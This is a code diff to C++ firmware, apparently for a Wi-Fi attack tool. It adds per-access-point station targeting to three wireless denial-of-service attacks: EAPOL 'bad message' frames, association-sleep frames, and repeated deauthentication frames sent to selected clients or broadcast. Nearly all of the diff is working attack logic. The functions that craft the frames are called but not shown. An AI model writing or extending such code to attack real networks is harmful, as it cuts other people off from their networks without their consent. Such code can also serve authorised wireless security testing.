@@ -2857,6 +2857,10 @@ bool WiFiScan::scanning() {
 
 // Function to prepare to run a specific scan
 void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
+  // Default every attack start to legacy (non-profile) targeting. The guided
+  // workflow re-enables station_profile right after this returns for the three
+  // station-capable attacks; the serial command never does, so it stays legacy.
+  this->station_profile = false;
   // Choose the heap-allocation policy for the NEW mode before anything runs:
   // AP-list scans route bulk allocations to PSRAM; every other mode -- Evil
   // Portal's softAP/web-server setup above all -- must build on the stock
@@ -10384,6 +10388,31 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
 
 
 void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
+  if (this->station_profile) {
+    // Guided per-AP profile: for each selected AP, target its selected stations;
+    // an AP with none selected is hit across all of its known clients.
+    for (int i = 0; i < access_points->size(); i++) {
+      AccessPoint access_point = access_points->get(i);
+      if (!access_point.selected) continue;
+      bool any_sta = false;
+      for (int x = 0; x < access_point.stations->size(); x++) {
+        if (stations->get(access_point.stations->get(x)).selected) {
+          any_sta = true;
+          this->sendEapolBagMsg1(access_point.bssid, access_point.channel,
+                                 stations->get(access_point.stations->get(x)).mac,
+                                 access_point.sec);
+        }
+      }
+      if (!any_sta) {
+        for (int x = 0; x < access_point.stations->size(); x++) {
+          this->sendEapolBagMsg1(access_point.bssid, access_point.channel,
+                                 stations->get(access_point.stations->get(x)).mac,
+                                 access_point.sec);
+        }
+      }
+    }
+    return;
+  }
   if (!all) {
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
@@ -10418,6 +10447,31 @@ void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
 }
 
 void WiFiScan::sendAssocSleepAttack(uint32_t currentTime, bool all) {
+  if (this->station_profile) {
+    // Guided per-AP profile: for each selected AP, target its selected stations;
+    // an AP with none selected is hit across all of its known clients.
+    for (int i = 0; i < access_points->size(); i++) {
+      AccessPoint access_point = access_points->get(i);
+      if (!access_point.selected) continue;
+      bool any_sta = false;
+      for (int x = 0; x < access_point.stations->size(); x++) {
+        if (stations->get(access_point.stations->get(x)).selected) {
+          any_sta = true;
+          this->sendAssociationSleep(access_point.essid.c_str(), access_point.bssid,
+                                     access_point.channel,
+                                     stations->get(access_point.stations->get(x)).mac);
+        }
+      }
+      if (!any_sta) {
+        for (int x = 0; x < access_point.stations->size(); x++) {
+          this->sendAssociationSleep(access_point.essid.c_str(), access_point.bssid,
+                                     access_point.channel,
+                                     stations->get(access_point.stations->get(x)).mac);
+        }
+      }
+    }
+    return;
+  }
   if (!all) {
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
@@ -13403,8 +13457,26 @@ void WiFiScan::main(uint32_t currentTime)
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
       if (access_point.selected) {
-        for (int i = 0; i < 55; i++) {
-          this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
+        if (this->station_profile) {
+          // Guided per-AP profile: target this AP's selected stations
+          // individually; an AP with no selected stations gets a broadcast deauth.
+          bool any_sta = false;
+          for (int x = 0; x < access_point.stations->size(); x++) {
+            if (stations->get(access_point.stations->get(x)).selected) {
+              any_sta = true;
+              for (int r = 0; r < 25; r++)
+                this->sendDeauthFrame(access_point.bssid, access_point.channel,
+                                      stations->get(access_point.stations->get(x)).mac);
+            }
+          }
+          if (!any_sta) {
+            for (int r = 0; r < 55; r++)
+              this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
+          }
+        } else {
+          for (int r = 0; r < 55; r++) {
+            this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
+          }
         }
       }
     }
